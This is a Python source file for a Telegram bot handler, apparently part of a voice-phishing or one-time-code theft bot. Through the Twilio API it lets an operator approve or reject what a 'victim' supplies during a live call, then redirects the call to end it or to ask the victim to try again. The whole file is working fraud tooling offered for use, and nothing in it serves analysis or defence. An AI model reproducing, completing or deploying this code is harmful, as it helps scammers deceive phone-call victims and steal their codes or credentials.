from telebot.types import CallbackQuery
from twilio.rest import Client
from config import bot, TWILIO_SID, TWILIO_TOKEN, TWILIO_APP_URL

# Inicializar cliente Twilio para poder modificar llamadas en vivo
twilio_client = None
if TWILIO_SID and TWILIO_TOKEN:
    try: twilio_client = Client(TWILIO_SID, TWILIO_TOKEN)
    except: pass

@bot.callback_query_handler(func=lambda call: call.data.startswith("live_"))
def handle_live_panel(call: CallbackQuery):
    """
    Maneja las acciones del Live Panel (Aprobar/Rechazar).
    Interrumpe la llamada en curso y redirige el flujo.
    """
    if not twilio_client:
        return bot.answer_callback_query(call.id, "❌ Twilio Error")

    # Extraemos la acción y el CallSid (ID único de la llamada)
    # Formato data: "live_approve_CA12345..."
    action, call_sid = call.data.split("_", 2)[1:] 
    
    try:
        if action == "approve":
            # 1. Avisamos a Telegram
            bot.edit_message_text(
                "✅ **APPROVED!**\n\nVictim accepted. Call ended.",
                call.message.chat.id,
                call.message.message_id,
                parse_mode="Markdown"
            )
            
            # 2. Ordenamos a Twilio: "Deja la música y ve a la URL de éxito"
            twilio_client.calls(call_sid).update(
                url=f"{TWILIO_APP_URL}/twilio/logic/approve",
                method="POST"
            )

        elif action == "reject":
            # 1. Avisamos a Telegram
            bot.edit_message_text(
                "❌ **REJECTED!**\n\nAsking victim to try again...",
                call.message.chat.id,
                call.message.message_id,
                parse_mode="Markdown"
            )
            
            # 2. Ordenamos a Twilio: "Deja la música y ve a la URL de rechazo"
            twilio_client.calls(call_sid).update(
                url=f"{TWILIO_APP_URL}/twilio/logic/reject",
                method="POST"
            )
            
    except Exception as e:
        print(f"🔴 Live Panel Error: {e}")
        bot.answer_callback_query(call.id, "⚠️ Call may have ended already.")
